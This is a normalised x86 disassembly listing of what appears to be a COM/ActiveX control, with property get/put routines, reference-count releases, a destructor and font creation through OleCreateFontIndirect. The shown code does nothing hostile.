mov ecx [ eax ]
mov edx [ ecx + 0x14 ]
push 0xfffffd3f
push eax
call edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_409890
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x88 ]
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
mov eax 0x80004003
pop ebp
retn 0x8
sub_4098c0
push ebp
mov ebp esp
push 0xffffffff
push sub_446f7e
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
movsx ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
add ecx ecx
xor ecx [ eax + 0x7c ]
mov [ ebp + 0xc ] 0x0
and ecx 0x2
xor [ eax + 0x7c ] ecx
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov edx [ eax ]
mov edx [ edx ]
lea ecx [ ebp + 0xc ]
push ecx
push r--data
push eax
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x14 ]
push 0xfffffd3b
push eax
call edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_409960
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x7c ]
and dl 0x2
movzx ecx dl
neg ecx
sbb ecx ecx
mov [ eax ] cx
xor eax eax
pop ebp
retn 0x8
mov eax 0x80004003
pop ebp
retn 0x8
sub_409990
push ebp
mov ebp esp
push 0xffffffff
push sub_446f7e
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
movsx ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
add ecx ecx
add ecx ecx
xor ecx [ eax + 0x7c ]
mov [ ebp + 0xc ] 0x0
and ecx 0x4
xor [ eax + 0x7c ] ecx
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov edx [ eax ]
mov edx [ edx ]
lea ecx [ ebp + 0xc ]
push ecx
push r--data
push eax
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x14 ]
push 0xfffffd37
push eax
call edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_409a30
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x7c ]
and dl 0x4
movzx ecx dl
neg ecx
sbb ecx ecx
mov [ eax ] cx
xor eax eax
pop ebp
retn 0x8
mov eax 0x80004003
pop ebp
retn 0x8
sub_409a60
push ebp
mov ebp esp
push 0xffffffff
push sub_446fce
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x8c ] edi
je r-xdata
mov esi [ esi + 0x14 ]
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ esi ]
mov eax [ ecx ]
lea edx [ ebp + 0x8 ]
push edx
push r--data
push esi
call eax
mov eax [ esi + 0x8c ]
test eax eax
je r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
push edi
call ecx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x14 ]
push 0xfffffd41
push eax
call edx
mov [ esi + 0x8c ] edi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_409b30
cmp [ esi ] 0x0
je r-xdata
retn
push edi
mov edi [ free@IAT ]
lea esp [ esp ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
mov [ esi ] ecx
call edi
add esp 0x4
cmp [ esi ] 0x0
jne r-xdata
pop edi
sub_409b80
push ebp
mov ebp esp
push 0xffffffff
push sub_4464f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor ecx ecx
mov [ ebp - 0x78 ] edi
mov [ ebp - 0x7c ] eax
cmp eax ecx
jne r-xdata
lea ebx [ edi + 0x8c ]
mov [ eax ] ecx
cmp [ ebx ] ecx
jne r-xdata
mov eax 0x80004003
jmp r-xdata
mov edx [ ebx ]
mov [ eax ] edx
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi [ GetStockObject@IAT ]
push 0x11
call esi
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
xor eax eax
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
lea ecx [ ebp - 0x6c ]
push ecx
push 0x5c
push eax
call [ GetObjectW@IAT ]
mov ax [ ebp - 0x5c ]
movzx ecx [ ebp - 0x55 ]
mov [ ebp - 0x8c ] ax
movzx eax [ ebp - 0x57 ]
lea edx [ ebp - 0x50 ]
mov [ ebp - 0x98 ] edx
movzx edx [ ebp - 0x58 ]
mov [ ebp - 0x8a ] cx
movzx ecx [ ebp - 0x56 ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x9c ] 0x20
mov [ ebp - 0x88 ] edx
mov [ ebp - 0x80 ] ecx
mov [ ebp - 0x74 ] eax
test eax eax
jns r-xdata
push 0xd
call esi
test eax eax
jne r-xdata
mov eax [ edi - 0x48 ]
test eax eax
je r-xdata
neg eax
mov [ ebp - 0x74 ] eax
call sub_409b60
mov edi eax
mov [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x70 ]
call sub_409b30
mov eax edi
jmp r-xdata
call [ GetDesktopWindow@IAT ]
push eax
call [ GetDC@IAT ]
mov esi eax
test esi esi
je r-xdata
push eax
call [ GetDC@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x5a
push esi
call [ GetDeviceCaps@IAT ]
push esi
mov edi eax
call [ GetDesktopWindow@IAT ]
push 0x5a
push esi
call [ GetDeviceCaps@IAT ]
mov edx [ ebp - 0x78 ]
mov edi eax
mov eax [ edx - 0x48 ]
push esi
jmp r-xdata
push eax
call [ ReleaseDC@IAT ]
mov eax [ ebp - 0x74 ]
imul eax eax 0xafc80
cdq
idiv edi
push ebx
push r--data
lea ecx [ ebp - 0x9c ]
push ecx
mov [ ebp - 0x90 ] 0x0
mov [ ebp - 0x94 ] eax
call [ OleCreateFontIndirect@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x70 ]
call sub_409b30
mov eax [ ebp - 0x7c ]
sub_409d50
push ebp
mov ebp esp
push 0xffffffff
push sub_446f7e
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
movsx ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
add ecx ecx
add ecx ecx
add ecx ecx
xor ecx [ eax + 0x7c ]
mov [ ebp + 0xc ] 0x0
and ecx 0x8
xor [ eax + 0x7c ] ecx
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov edx [ eax ]
mov edx [ edx ]
lea ecx [ ebp + 0xc ]
push ecx
push r--data
push eax
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x14 ]
push 0xfffffd3e
push eax
call edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_409e00
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x7c ]
and dl 0x8
movzx ecx dl
neg ecx
sbb ecx ecx
mov [ eax ] cx
xor eax eax
pop ebp
retn 0x8
mov eax 0x80004003
pop ebp
retn 0x8
sub_409e40
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
pop ebp
retn 0x8
mov eax 0x80004003
pop ebp
retn 0x8
sub_409e60
push ebp
mov ebp esp
push 0xffffffff
push sub_44706e
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x60 ]
xor esi esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ ebp + 0x8 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x14 ]
call eax
mov esi eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_409ef0
push ebp
mov ebp esp
push 0xffffffff
push sub_44701e
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x94 ] ecx
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
mov edx [ edx ]
lea ecx [ ebp + 0x8 ]
push ecx
push r--data
push eax
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x14 ]
push 0xffffffff
push eax
call edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_409f90
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x94 ]
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
mov eax 0x80004003
pop ebp
retn 0x8
sub_409fe0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x98 ]
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
mov eax 0x80004003
pop ebp
retn 0x8
sub_40a030
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x7c ]
and dl 0x20
movzx ecx dl
neg ecx
sbb ecx ecx
mov [ eax ] cx
xor eax eax
pop ebp
retn 0x8
mov eax 0x80004003
pop ebp
retn 0x8
sub_40a080
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x7c ]
and dl 0x40
movzx ecx dl
neg ecx
sbb ecx ecx
mov [ eax ] cx
xor eax eax
pop ebp
retn 0x8
mov eax 0x80004003
pop ebp
retn 0x8
sub_40a0b0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x9c ]
cmp esi eax
je r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0x8
push eax
call [ SysFreeString@IAT ]
test esi esi
je r-xdata
mov [ edi + 0x9c ] 0x0
push esi
call [ SysAllocString@IAT ]
mov [ edi + 0x9c ] eax
test eax eax
jne r-xdata
push 0x8007000e
call sub_402d00
sub_40a100
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x9c ]
push eax
call [ SysAllocString@IAT ]
mov [ esi ] eax
xor eax eax
pop esi
pop ebp
retn 0x8
mov eax 0x80004003
pop esi
pop ebp
retn 0x8
sub_40a130
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x8 ] esi
je r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0x8
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push esi
call ecx
mov [ edi + 0x8 ] esi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
sub_40a170
push ebp
mov ebp esp
push 0xffffffff
push sub_4496f8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_404380
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov [ esi ] r--data
mov [ esi + 0x24 ] r--data
mov [ esi + 0x28 ] r--data
mov [ esi + 0x2c ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] r--data
mov [ esi + 0x40 ] r--data
mov [ esi + 0x44 ] r--data
mov [ esi + 0x48 ] r--data
mov [ esi + 0x4c ] r--data
mov [ esi + 0x50 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_40a210
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
mov esi eax
test ecx ecx
je r-xdata
mov eax 0x80070057
pop esi
pop ebp
retn 0x8
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov [ eax ] 0x0
cmp [ edi ] 0x0
jne r-xdata
mov eax 0x80004003
pop esi
pop ebp
retn 0x8
mov ecx [ esi + 0x8 ]
push ebx
test ecx ecx
je r-xdata
cmp [ edi + 0x4 ] 0x0
jne r-xdata
mov eax 0x80004002
nop
cmp [ edi + 0x8 ] 0xc0
jne r-xdata
cmp ecx 0x1
je r-xdata
mov edx [ eax ]
cmp edx [ edi ]
jne r-xdata
cmp [ edi + 0xc ] 0x46000000
jne r-xdata
mov esi [ esi + 0x4 ]
add esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push esi
call ecx
mov edx [ ebp + 0xc ]
pop ebx
mov [ edx ] esi
xor eax eax
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x4 ]
mov eax [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push eax
push edi
push edx
call ecx
test eax eax
je r-xdata
mov ecx [ esi + 0x14 ]
add esi 0xc
test ecx ecx
jne r-xdata
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov esi [ esi + 0x4 ]
mov eax [ esi + ecx ]
add esi ecx
mov ecx [ eax + 0x4 ]
push esi
call ecx
mov edx [ ebp + 0xc ]
mov [ edx ] esi
xor eax eax
pop esi
pop ebp
retn 0x8
pop ebx
pop esi
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
mov eax [ esi ]
xor ebx ebx
test eax eax
sete bl
test ebx ebx
jne r-xdata
mov edx [ eax + 0x8 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
test eax eax
js r-xdata
mov eax [ eax + 0xc ]
cmp eax [ edi + 0xc ]
jne r-xdata
sub_40a310
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
mov [ eax ] 0x0
cmp [ edi ] esi
jne r-xdata
mov eax 0x80004003
pop ebp
retn 0xc
mov edx [ ebp + 0x8 ]
push eax
add edx 0x8
push edx
mov eax r--data
call sub_40a210
pop edi
mov esi eax
pop esi
pop ebp
retn 0xc
cmp [ edi + 0x4 ] esi
jne r-xdata
cmp [ edi + 0x8 ] 0xc0
jne r-xdata
cmp [ edi + 0xc ] 0x46000000
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ecx ]
push ecx
mov ecx [ eax + 0x4 ]
call ecx
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
sub_40a380
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
dec [ ecx + 0x4 ]
push esi
mov esi [ ecx + 0x4 ]
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push 0x1
call edx
sub_40a3b0
push ebp
mov ebp esp
push 0xffffffff
push sub_44a425
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x8 ]
mov [ edi + 0x4 ] 0xc0000001
call sub_40a850
mov ecx [ rw-data ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov ecx esi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
call sub_40a550
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push edi
call [ operator delete@IAT ]
add esp 0x4
sub_40a450
push ebp
mov ebp esp
push 0xffffffff
push sub_4464cb
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_443ef4
sub_40a4a0
push ebp
mov ebp esp
push 0xffffffff
push sub_445345
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
or edx 0xffffffff
mov [ ebp - 0x4 ] edx
lea eax [ ecx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_40a500
push ebp
mov ebp esp
push 0xffffffff
push sub_445308
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_40a550
push ebp
mov ebp esp
push 0xffffffff
push sub_4496cc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xc
mov eax [ esi + 0xe8 ]
push eax
call [ SysFreeString@IAT ]
mov cl 0xb
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0xdc ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov cl 0xa
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0xd8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov cl 0x9
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x7c ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov cl 0x8
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x78 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov cl 0x7
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x74 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov cl 0x6
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x70 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov cl 0x5
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x6c ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov cl 0x4
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x68 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov cl 0x3
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x64 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov cl 0x2
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x60 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov cl 0x1
mov [ ebp - 0x4 ] cl
lea eax [ esi + 0x54 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x38 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
add eax 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ecx
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_443ef4
sub_40a720
push ebp
mov ebp esp
push 0xffffffff
push sub_449ea8
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0x8 ]
call sub_40a550
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_40a770
push ebp
mov ebp esp
push 0xffffffff
push sub_4464a4
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x3
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov esi eax
test esi esi
js r-xdata
mov eax 0x80070057
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
lea edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx + 0x10 ]
call eax
mov esi eax
test esi esi
js r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x18 ]
call eax
mov esi eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_40a850
push ebp
mov ebp esp
push 0xffffffff
push sub_44672a
mov eax [ fs : 0x0 ]
push eax
push ecx
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ esi + 0x98 ]
test al 0x40
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn
or eax 0x40
mov [ esi + 0x98 ] eax
mov eax [ esi + 0x70 ]
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esi + 0x94 ]
cmp eax 0xcdcdcdcd
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x1c ]
push edi
push edi
push 0x1
push eax
call edx
mov eax [ esi + 0x64 ]
cmp eax edi
je r-xdata
mov ecx [ esi + 0x60 ]
push eax
lea eax [ esi + 0x80 ]
push eax
push ecx
call sub_40a770
mov [ esi + 0x94 ] 0xcdcdcdcd
cmp [ esi + 0x60 ] edi
je r-xdata
mov edx [ esi + 0x9c ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x50 ]
call eax
mov eax [ esi + 0x64 ]
mov ecx [ eax ]
mov edx [ ecx + 0x18 ]
push 0x1
push eax
call edx
mov eax [ esi + 0x64 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
push edi
push eax
call edx
